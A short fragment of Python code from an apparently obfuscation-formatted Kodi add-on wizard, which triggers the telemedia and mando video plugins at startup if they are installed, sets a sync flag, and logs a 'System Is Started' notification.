            if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:673
                xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=207&url=www)")#line:674
            if os .path .exists (os .path .join (ADDONS ,'plugin.video.mando')):#line:675
                xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.mando?mode=200&url=www)")#line:676
            ADDON .setSetting ("startup_sync",'true')#line:679
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]System Is Started[/COLOR]'%COLOR2 )